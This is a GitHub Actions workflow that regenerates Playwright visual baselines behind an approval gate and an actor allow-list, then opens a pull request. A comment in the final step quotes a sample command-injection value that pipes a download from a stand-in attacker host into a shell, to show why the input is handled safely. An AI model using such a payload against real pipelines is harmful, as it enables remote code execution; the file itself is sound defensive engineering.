# yaml-language-server: $schema=https://json.schemastore.org/github-workflow.json
name: Update Visual Snapshots

on:
  workflow_dispatch:
    inputs:
      reason:
        description: "Reason for regenerating baselines (e.g. intentional design change)"
        required: true
        type: string

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  contents: write
  pull-requests: write

env:
  NODE_VERSION: "24"
  CACHE_VERSION: v3

jobs:
  update-snapshots:
    name: Regenerate Linux Baselines
    runs-on: ubuntu-latest
    timeout-minutes: 25
    # TWO independent gates protect the contents:write + pull-requests:write
    # capability of this workflow:
    #
    #   1. `environment: visual-baselines` requires manual approval from a
    #      reviewer configured in the repository's environment settings.
    #      An attacker with `actions:write` cannot bypass an environment
    #      reviewer requirement — the gate is enforced server-side by GitHub.
    #
    #   2. The inline `if:` allow-list is a defence-in-depth guard for the
    #      case where a maintainer accidentally drops the environment
    #      configuration (or has not yet provisioned it on a fresh fork).
    #
    # To add a maintainer: edit BOTH the environment reviewer list AND the
    # JSON array below; both must agree.
    environment: visual-baselines
    if: contains(fromJSON('["marco-onapex"]'), github.actor)
    steps:
      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
        with:
          fetch-depth: 0

      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: "npm"

      - name: Cache node_modules
        id: cache-nm
        uses: actions/cache@27d5ce7f107fe9357f9df03efb73ab90386fccae # v5.0.5
        with:
          path: node_modules
          key: ${{ runner.os }}-nm-${{ env.CACHE_VERSION }}-node${{ env.NODE_VERSION }}-${{ hashFiles('**/package-lock.json') }}

      - name: Install dependencies
        if: steps.cache-nm.outputs.cache-hit != 'true'
        run: npm ci --prefer-offline

      - name: Cache Playwright browsers
        uses: actions/cache@27d5ce7f107fe9357f9df03efb73ab90386fccae # v5.0.5
        with:
          path: ~/.cache/ms-playwright
          key: ${{ runner.os }}-playwright-${{ env.CACHE_VERSION }}-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-playwright-${{ env.CACHE_VERSION }}-

      - name: Install Playwright browsers
        run: npx playwright install --with-deps chromium firefox webkit

      # Round 20 (option B): Playwright's webServer spawns
      # dev-server.js, which serves `.deploy/`. Without a prior
      # build, dev-server fails fast (intentional pre-flight in
      # round 20) and Playwright reports webServer-start failure.
      # Building here populates the artefact directory before
      # baseline regeneration runs.
      - name: Production build (populates .deploy/ for dev-server)
        run: npm run build

      - name: Regenerate all visual baselines
        run: npx playwright test tests/e2e/visual.spec.js --update-snapshots --workers=1

      - name: Verify regenerated snapshots pass
        run: npx playwright test tests/e2e/visual.spec.js --workers=1

      - name: Open PR with updated baselines
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"

          BRANCH="chore/update-visual-baselines-$(date +%Y%m%d-%H%M%S)"
          git checkout -b "$BRANCH"
          git add tests/e2e/visual.spec.js-snapshots/

          if git diff --cached --quiet; then
            echo "No snapshot changes — nothing to commit."
            exit 0
          fi

          # User input (REASON, ACTOR) is passed via env vars and referenced
          # with plain $VAR shell syntax — NOT GitHub-Actions expression
          # interpolation. The shell sees the value as a string literal, not
          # as inlined source code, so an attacker-controlled reason like
          #   '"; curl evil.com | sh; #'
          # is a harmless commit-message string here, not a command.
          git commit -m "test: regenerate visual baselines on Linux — ${REASON:-manual trigger}"
          git push origin "$BRANCH"

          gh pr create \
            --title "test: regenerate visual baselines" \
            --body "$(printf '%s\n' \
              "Automated baseline regeneration triggered by @${ACTOR}." \
              "" \
              "**Reason:** ${REASON:-(none)}" \
              "" \
              "Review the snapshot diffs carefully before merging — each changed image is a visual change visible to users.")" \
            --base main \
            --head "$BRANCH"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ACTOR: ${{ github.actor }}
          REASON: ${{ inputs.reason }}
